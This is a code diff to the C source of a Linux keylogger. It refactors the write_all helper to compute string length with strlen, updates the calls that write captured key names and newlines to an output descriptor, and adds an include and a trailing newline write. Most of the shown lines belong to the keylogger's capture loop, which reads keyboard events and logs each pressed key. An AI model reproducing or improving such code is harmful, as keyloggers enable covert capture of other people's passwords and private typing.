@@ -1,5 +1,6 @@
 #include <linux/input.h>
 #include <stdio.h>
+#include <unistd.h>
 #include <signal.h>
 #include <string.h>
 #include "keylogger.h"
@@ -87,16 +88,15 @@ void sigint_handler(int sig){
     loop = 0;
 }
 
-/*
- * Ensures that len characters of the string pointed to by str is written to
- * the file with file descriptor file_desc. The string must be len characters
- * long and null terminated.
+/**
+ * Ensures that the string pointed to by str is written to the file with file
+ * descriptor file_desc.
  *
  * \returns 1 if writing completes succesfully, else 0
  */
-int write_all(int file_desc, const char *str, int len){
+int write_all(int file_desc, const char *str){
     int bytesWritten = 0;
-    int bytesToWrite = len + 1;
+    int bytesToWrite = strlen(str) + 1;
 
     do {
         bytesWritten = write(file_desc, str, bytesToWrite);
@@ -123,8 +123,8 @@ void keylogger(int keyboard, int writeout){
             if(events[i].type == EV_KEY){
                 if(events[i].value == 1){
                     if(events[i].code > 0 && events[i].code < NUM_KEYCODES){
-                        write_all(writeout, keycodes[events[i].code], strlen(keycodes[events[i].code]));
-                        write_all(writeout, "\n", 1);
+                        write_all(writeout, keycodes[events[i].code]);
+                        write_all(writeout, "\n");
                     }
                     else{
                         write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
@@ -133,4 +133,5 @@ void keylogger(int keyboard, int writeout){
             }
         }
     }
+    write_all(writeout, "\n");
 }
